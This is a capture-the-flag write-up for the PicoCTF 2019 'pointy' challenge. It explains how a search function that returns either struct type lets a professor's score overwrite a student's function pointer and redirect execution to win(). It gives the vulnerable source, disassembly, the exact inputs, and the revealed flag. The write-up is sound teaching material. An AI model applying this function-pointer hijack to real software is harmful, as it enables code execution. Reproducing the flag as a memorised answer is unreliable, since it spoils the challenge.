# PicoCTF 2019 - pointy
Author: PinkNoize

Binary Exploitation - 350

> Exploit the function pointers in this program. It is also found in /problems/pointy_4_3b3533bd4e08119669feda53e8cb0502 on the shell server.

## TL;DR

This challenge consists of a program that has two structs with similar definitions, except one has an integer where one has a function pointer. To get the flag, utilize a bad search function to trick the program into using the integer as a function pointer.

# Writeup

This challenge provides a program with a good amount of moving parts such that you should take your time reading and understanding the source code.

```c
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define FLAG_BUFFER 128
#define NAME_SIZE 128
#define MAX_ADDRESSES 1000

int ADRESSES_TAKEN=0;
void *ADDRESSES[MAX_ADDRESSES];

void win() {
    char buf[FLAG_BUFFER];
    FILE *f = fopen("flag.txt","r");
    fgets(buf,FLAG_BUFFER,f);
    puts(buf);
    fflush(stdout);
}

struct Professor {
    char name[NAME_SIZE];
    int lastScore;
};

struct Student {
    char name[NAME_SIZE];
    void (*scoreProfessor)(struct Professor*, int);
};

void giveScoreToProfessor(struct Professor* professor, int score){
    professor->lastScore=score;
    printf("Score Given: %d \n", score);

}

void* retrieveProfessor(char * name ){
    for(int i=0; i<ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];
        }
    }
    puts("person not found... see you!");
    exit(0);
}

void* retrieveStudent(char * name ){
    for(int i=0; i<ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];
        }
    }
    puts("person not found... see you!");
    exit(0);
}

void readLine(char * buff){
    int lastRead = read(STDIN_FILENO, buff, NAME_SIZE-1);
    if (lastRead<=1){
        exit(0);
        puts("could not read... see you!");
    }
    buff[lastRead-1]=0;
}

int main (int argc, char **argv)
{
    while(ADRESSES_TAKEN<MAX_ADDRESSES-1){
        printf("Input the name of a student\n");
        struct Student* student = (struct Student*)malloc(sizeof(struct Student));
        ADDRESSES[ADRESSES_TAKEN]=student;
        readLine(student->name);
        printf("Input the name of the favorite professor of a student \n");
        struct Professor* professor = (struct Professor*)malloc(sizeof(struct Professor));
        ADDRESSES[ADRESSES_TAKEN+1]=professor;
        readLine(professor->name);
        student->scoreProfessor=&giveScoreToProfessor;
        ADRESSES_TAKEN+=2;
        printf("Input the name of the student that will give the score \n");
        char  nameStudent[NAME_SIZE];
        readLine(nameStudent);
        student=(struct Student*) retrieveStudent(nameStudent);
        printf("Input the name of the professor that will be scored \n");
        char nameProfessor[NAME_SIZE];
        readLine(nameProfessor);
        professor=(struct Professor*) retrieveProfessor(nameProfessor);
        puts(professor->name);
        unsigned int value;
            printf("Input the score: \n");
            scanf("%u", &value);
        student->scoreProfessor(professor, value);       
    }
    return 0;
```

The most important parts of this program to understand are  `struct Student`, `struct Professor`, `retrieveStudent()` and `retrieveProfessor()`. As we can see from the struct definitions, the only difference between them is one has an integer attribute and one has a function attribute. The `retrieveStudent()` and `retrieveProfessor()` are identical and search for the first element in `ADDRESSES` that has the same name as the one requested. We later will exploit the fact that these functions don't distinguish between professors and students.


Before we can write the exploit, we first have to understand how function pointers work. When we allocate a struct such as `struct Student* student = (struct Student*)malloc(sizeof(struct Student));`, some amount of memory is allocated that can fit all the attributes of the struct. In this case, these are at least 128 bytes for the `name` buffer and at least 4 bytes for the address of the function that `scoreProfessor` points to. It also this case for `struct Professor` with the only difference being that the 4 bytes are for an integer, `score`. When you assign `scoreProfessor` to a function, it sets the 4 bytes to the address of the specified function. Then when you call the function, the address is loaded into a register then the register is the target of a call as shown below.

```gas
8048a60:       8b 85 ec fe ff ff       mov    eax,DWORD PTR [ebp-0x114] ; get address of struct
8048a66:       8b 80 80 00 00 00       mov    eax,DWORD PTR [eax+0x80]  ; get function address using offset
...
8048a7c:       ff d0                   call   eax
```

If we were able to make a `struct Professor` where we controlled the score and trick the program into thinking it is a student, we can make the program call any function such as `win()`. This would only happen if `scoreProfessor` is called on that `struct Professor`.

In `main()`, `scoreProfessor` is called at the end of the while loop on `student`. The last assignment of `student` is from a call to `retrieveStudent()`. As `retrieveStudent()` can return a `struct Professor`, we can call `win()`.

Now we can start our exploit, first we will create a student as prompted. I'm calling this student "stu1". Then we will create a professor called "prof1". We will score prof1 using stu1. The score value must be the address of `win()`, **0x08048696**. We have to convert this to decimal so that `scanf` parses the correct value. So the score would be **134514326**. Now that we set the score of prof1 to the address of `win()`, we have to trick the program into treating it as a student. On the next loop we will create another student and professor whose names do not matter. Then we will *score this professor using prof1*. The score doesn't matter here. The process will then call `win()` and print the flag.

```bash
user@pico-2019-shell1:/problems/pointy_4_3b3533bd4e08119669feda53e8cb0502$ ./vuln 
Input the name of a student
stu1
Input the name of the favorite professor of a student 
prof1
Input the name of the student that will give the score 
stu1
Input the name of the professor that will be scored 
prof1
prof1
Input the score: 
134514326
Score Given: 134514326 
Input the name of a student
stu2
Input the name of the favorite professor of a student 
prof2
Input the name of the student that will give the score 
prof1
Input the name of the professor that will be scored 
prof2
prof2
Input the score: 
5
picoCTF{g1v1ng_d1R3Ct10n5_c7465fbf}
Input the name of a student
```